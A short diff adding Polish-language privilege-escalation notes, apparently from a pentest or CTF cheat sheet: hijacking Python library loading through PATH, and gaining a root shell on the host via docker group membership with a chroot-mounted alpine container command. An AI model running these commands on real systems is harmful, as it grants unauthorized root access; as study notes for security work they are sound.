@@ -1,1 +1,5 @@
 1) Skrypty pythona laduja biblioteki szukajac pod zmiennymi srodowiskowymi “import os” mozna to wykozystac export PATH=<path>:$PATH
+
+2)Spr: (command: id)
+→ Grupa (docker) Nalezenie do grupy docker
+      • (root) docker run -v /:/mnt --rm -it alpine chroot /mnt sh
